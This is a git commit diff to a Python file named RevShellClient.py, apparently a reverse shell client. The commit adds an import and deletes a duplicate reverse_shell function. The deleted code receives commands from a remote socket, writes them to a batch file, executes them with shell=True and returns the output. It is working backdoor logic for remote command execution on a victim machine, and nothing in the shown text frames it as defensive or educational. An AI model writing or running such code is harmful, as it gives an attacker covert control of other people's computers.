21c41b6605ca0372f3e6240049bee2eae7280a41
Bt08s <68190921+Bt08s@users.noreply.github.com>
2023-11-05 09:21:06 +0300

    Update RevShellClient.py

--- RevShellClient.py
+++ RevShellClient.py
@@ -1,4 +1,5 @@
 import subprocess
+import platform
 import socket
 import time
 import os
@@ -20,18 +21,6 @@ def connect():
             print("Error:", e)
 
         time.sleep(5)
-
-
-def reverse_shell(client):
-    file_path = "data.bat"
-    while True:
-        data = client.recv(1024).decode()
-        if data:
-            with open(file_path, 'w') as file:
-                file.write(data)
-            output = subprocess.check_output(file_path, shell=True, text=True)
-            client.sendall(output.encode())
-            os.remove(file_path)
 
 
 def reverse_shell(client):
